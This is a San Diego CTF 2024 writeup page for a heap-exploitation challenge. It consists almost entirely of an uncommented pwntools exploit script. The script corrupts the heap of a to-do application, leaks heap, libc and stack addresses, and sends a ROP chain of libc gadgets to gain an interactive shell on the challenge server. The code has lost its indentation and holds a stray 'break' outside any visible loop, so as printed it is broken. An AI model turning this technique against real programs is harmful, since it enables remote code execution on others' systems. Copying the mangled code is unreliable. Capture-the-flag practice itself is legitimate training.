---
title: "Def1nit3lysAfetoDol1st5iNc31hAveF0rb1dUnsafec0de - San Diego CTF 2024"
category: "pwn"
subcategory: "heap"
type: "writeup"
tags: ["pwn", "heap", "def1nit3lysafetodol1st5inc31havef0rb1dunsafec0de", "san-diego-ctf", "san-diego-ctf-2024", "2024", "ctf-writeup"]
summary: "p = remote(\"172.20.36.128\", 61408)"
source:
  name: "CTFtime writeup #39152"
  url: "https://ctftime.org/writeup/39152"
original_source: "https://uz56764.tistory.com/125"
ctf:
  name: "San Diego CTF 2024"
  year: 2024
  challenge: "Def1nit3lysAfetoDol1st5iNc31hAveF0rb1dUnsafec0de"
---

## Metadata

- **CTF:** San Diego CTF 2024
- **Task:** Def1nit3lysAfetoDol1st5iNc31hAveF0rb1dUnsafec0de
- **Author team:** The Amazing Digital Orange!
- **CTFtime:** <https://ctftime.org/writeup/39152>
- **Original writeup:** <https://uz56764.tistory.com/125>

---
> <https://uz56764.tistory.com/125>

```py  
from pwn import *

#p = process('./chall')  
p = remote("172.20.36.128", 61408)

def add_to_do(name, content_length, content):  
name = name if type(name) == bytes else name.encode()  
content = content if type(content) == bytes else content.encode()

p.sendlineafter(b'>', b'1')  
p.sendlineafter(b'Input name:', name)  
p.sendlineafter(b'Input content size:', str(content_length).encode())

if content_length != 0:  
p.sendlineafter(b'Input content:', content)  
else:  
p.sendlineafter(b'Input content:', b'4')

def mark_as_done(indexes, insert_index):  
p.sendlineafter(b'>', b'2')  
p.sendlineafter(b'Input index:', ','.join(map(str, indexes)).encode())  
p.sendlineafter(b'Input insert index:', str(insert_index).encode())

dummy_count = 7

for i in range(dummy_count):  
add_to_do(f'Dummy{i}', 0, '')

mark_as_done([0], 0)

add_to_do(f'______', 4097, 'A') 

mark_as_done(range(dummy_count - 1), 0)

nn = 0x400  
add_to_do(f'targetX', nn, 'contentX')

p.sendlineafter(b'>', b'4')

p.recvuntil(b'targetX\n')  
p.recvn(8)  
heap_base = u64(p.recvn(8)) - 0x3f10  
print(f'heap_base = {hex(heap_base)}'); raw_input()

time.sleep(0.5)  
p.sendlineafter(b'>', b'4')

p.recvuntil(b'content: ')

data = p.recvn(nn)

for i in range(0,7):  
print(i)  
data = data[:0x120] + p64(heap_base+0xc00+0x400*i) + data[0x120+0x8:]

time.sleep(0.1)  
p.sendline(b'3')  
p.sendlineafter(b':', b'0')  
p.sendlineafter(b':', data)

p.sendlineafter(b'>', b'4')

#p.recvuntil(b'\x7f')  
libc_base = u64(p.recvuntil(b'\x7f', timeout=3)[-6:].ljust(8,b'\x00'))   
if libc_base != 0:  
break  
p.clean()  
libc_base = libc_base - 0x1fed30  
print(f'libc_base = {hex(libc_base)}'); raw_input()

data = data[:0x120] + p64(libc_base+0x206258) + data[0x120+0x8:]

p.sendlineafter(b'>', b'3')  
p.sendlineafter(b':', b'0')  
p.sendlineafter(b':', data)

p.sendlineafter(b'>', b'4')

p.recvuntil(b'[01]: name: targetX')

stack = u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00')) - 0x3b0  
print(f'stack = {hex(stack)}'); raw_input()  
#0x00007fff2e32edf8

data = data[:0x120] + p64(stack) + data[0x120+0x8:]  
p.sendlineafter(b'>', b'3')  
p.sendlineafter(b':', b'0')  
p.sendlineafter(b':', data)

pay = b''

pay += p64(libc_base+0x0000000000028ac2)  
pay += p64(libc_base+0x1c041b)  
pay += p64(libc_base+0x1c041b)  
pay += p64(libc_base+0x0000000000028795)  
pay += p64(libc_base+0x1c041b)  
pay += p64(libc_base+0x552b0)

pay += p64(0xdeadbeef)

p.sendlineafter(b'>', b'3')  
p.sendlineafter(b':', b'1')  
p.sendlineafter(b':', pay)

p.interactive()  
```
